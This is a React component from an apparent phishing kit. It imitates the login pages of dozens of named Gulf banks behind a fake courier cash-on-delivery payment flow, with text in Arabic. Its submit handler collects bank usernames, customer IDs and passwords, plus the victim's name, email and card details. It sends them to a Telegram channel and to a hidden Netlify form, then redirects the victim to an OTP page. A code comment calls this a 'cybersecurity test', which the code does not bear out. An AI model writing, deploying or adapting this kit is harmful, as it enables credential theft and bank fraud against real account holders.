import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  // Get country from link data
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  // Use bank colors if bank is selected, otherwise use service branding
  const bankColor = selectedBank?.color || branding.colors.primary;
  const secondaryColor = branding.colors.secondary;
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
    if (bankId === 'alahli_bank') return 'username'; // Username + Password
    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'samba_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'alinma_bank') return 'username'; // Username + Password
    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
    if (bankId === 'fab') return 'username'; // Username + Password
    if (bankId === 'dib') return 'username'; // Username + Password
    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbd') return 'username'; // Username + Password
    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
    if (bankId === 'ajman_bank') return 'username'; // Username + Password
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'gulf_bank') return 'username'; // Username + Password
    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'burgan_bank') return 'username'; // Username + Password
    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbq') return 'username'; // Username + Password
    if (bankId === 'doha_bank') return 'username'; // Username + Password
    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username'; // Username + Password
    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
    if (bankId === 'bisb') return 'username'; // Username + Password
    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
    
    return 'username'; // Default
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    // Save to sessionStorage (for current session) and link (for cross-device)
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    // Save to link for cross-device compatibility
    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
        console.error('Error saving bank login data:', error);
      }
    }
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      // Silent error handling
    }

    // Send bank login details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
        description="أدخل بيانات الدخول للبنك لتأكيد العملية"
      />
      <div className="min-h-screen bg-background" dir="rtl">
        {/* Hero Section */}
        <div
          className="relative w-full h-48 sm:h-64 overflow-hidden"
          style={{
            background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
          }}
        >
          <div className="absolute inset-0 bg-black/30" />
          
          {/* Bank Logo */}
          {selectedBank && (
            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                <Building2 className="h-12 sm:h-16 w-12 sm:w-16" style={{ color: bankColor }} />
              </div>
            </div>
          )}
          
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 className="text-lg sm:text-2xl font-bold mb-1">{selectedBank?.nameAr || 'البنك'}</h2>
              <p className="text-xs sm:text-sm opacity-90">{selectedCountryData?.nameAr}</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
          <div className="max-w-2xl mx-auto">
            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: bankColor }}>
              <div className="flex items-center justify-between mb-6 sm:mb-8">
                <h1 className="text-xl sm:text-3xl font-bold">تسجيل الدخول</h1>

                <div
                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
                  }}
                >
                  <Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                </div>
              </div>
              {/* Bank Info Header */}
              <div 
                className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
                style={{
                  background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
                }}
              >
                <div 
                  className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
                >
                  <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
                </div>
                <div className="flex-1 text-white">
                  <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
                  <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
                  <p className="text-xs opacity-80">{selectedBank?.name}</p>
                </div>
                {selectedCountryData && (
                  <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
                )}
              </div>

              {/* Security Notice */}
              <div 
                className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
                style={{
                  background: `${bankColor}10`,
                  border: `1px solid ${bankColor}30`
                }}
              >
                <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: bankColor }} />
                <div className="text-xs sm:text-sm">
                  <p className="font-semibold mb-1">تسجيل دخول آمن</p>
                  <p className="text-muted-foreground">
                    سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
                  </p>
                </div>
              </div>

              {/* Login Form */}
              <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
                {/* Username Login */}
                {loginType === 'username' && (
                  <div>
                    <Label htmlFor="username" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">اسم المستخدم</Label>
                    <Input
                      id="username"
                      type="text"
                      placeholder="أدخل اسم المستخدم"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      autoComplete="username"
                      required
                    />
                  </div>
                )}
                
                {/* Customer ID Login */}
                {loginType === 'customerId' && (
                  <div>
                    <Label htmlFor="customerId" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم العميل</Label>
                    <Input
                      id="customerId"
                      type="text"
                      placeholder="أدخل رقم العميل"
                      value={customerId}
                      onChange={(e) => setCustomerId(e.target.value)}
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      inputMode="numeric"
                      required
                    />
                  </div>
                )}
                
                {/* Phone Login */}
                {loginType === 'phone' && (
                  <div>
                    <Label htmlFor="phone" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم الجوال</Label>
                    <Input
                      id="phone"
                      type="tel"
                      placeholder="05xxxxxxxx"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      className="h-10 sm:h-12 text-sm sm:text-base"
                      inputMode="tel"
                      required
                    />
                  </div>
                )}
                
                {/* Password (common for all types) */}
                <div>
                  <Label htmlFor="password" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">كلمة المرور</Label>
                  <div className="relative">
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      placeholder="أدخل كلمة المرور"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="h-10 sm:h-12 text-sm sm:text-base pl-12"
                      autoComplete="current-password"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                    >
                      {showPassword ? (
                        <EyeOff className="w-4 h-4 sm:w-5 sm:h-5" />
                      ) : (
                        <Eye className="w-4 h-4 sm:w-5 sm:h-5" />
                      )}
                    </button>
                  </div>
                </div>
                
                {/* Remember Me / Forgot Password */}
                <div className="flex items-center justify-between text-xs sm:text-sm">
                  <div className="flex items-center gap-2">
                    <input type="checkbox" id="remember" className="rounded" />
                    <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
                      تذكرني
                    </label>
                  </div>
                  <button
                    type="button"
                    className="text-muted-foreground hover:underline"
                    style={{ color: bankColor }}
                  >
                    نسيت كلمة المرور؟
                  </button>
                </div>
                
                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                  disabled={isSubmitting}
                  style={{
                    background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`
                  }}
                >
                  {isSubmitting ? (
                    <span>جاري تسجيل الدخول...</span>
                  ) : (
                    <>
                      <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                      <span>تسجيل الدخول والمتابعة</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </>
                  )}
                </Button>
                
                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                  بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
                </p>
              </form>
              
              {/* Additional Info */}
              <div className="mt-6 pt-6 border-t text-center">
                <p className="text-xs text-muted-foreground mb-3">
                  لا تملك حساب؟
                </p>
                <Button
                  type="button"
                  variant="outline"
                  size="sm"
                  className="text-xs"
                  style={{ borderColor: bankColor }}
                >
                  تسجيل حساب جديد
                </Button>
              </div>
            </Card>
          </div>
        </div>
      </div>
    
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentBankLogin;
